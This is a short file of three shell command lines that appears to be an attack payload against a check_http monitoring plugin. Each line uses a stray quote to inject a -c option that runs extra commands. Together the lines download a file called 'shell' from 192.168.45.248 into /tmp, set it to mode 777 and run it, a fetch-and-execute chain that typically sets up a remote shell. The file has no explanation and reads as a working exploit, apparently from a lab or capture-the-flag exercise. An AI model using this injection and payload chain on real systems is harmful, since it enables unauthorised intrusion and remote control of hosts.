./check_http -I 192.168.45.248 -p 4444' -c 'wget http://192.168.45.248/shell -O /tmp/shell
./check_http -I 192.168.45.248 -p 4444' -c 'chmod 777 /tmp/shell
./check_http -I 192.168.45.248 -p 4444' -c '/tmp/shell

